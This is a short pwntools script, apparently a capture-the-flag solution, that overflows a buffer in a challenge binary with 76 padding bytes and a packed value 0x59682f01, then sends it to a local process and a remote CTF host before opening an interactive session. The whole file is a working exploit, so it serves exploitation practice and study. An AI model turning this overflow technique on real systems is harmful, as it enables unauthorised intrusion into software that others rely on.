#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./chal", checksec=False)

p = process(exe.path)
p = remote("kubenode.mctf.io", 30005)

input("Attach gdb")
padding = 76

payload = b"A" * padding
payload += p64(0x59682f01)

p.sendlineafter(b"name?", payload)

p.interactive()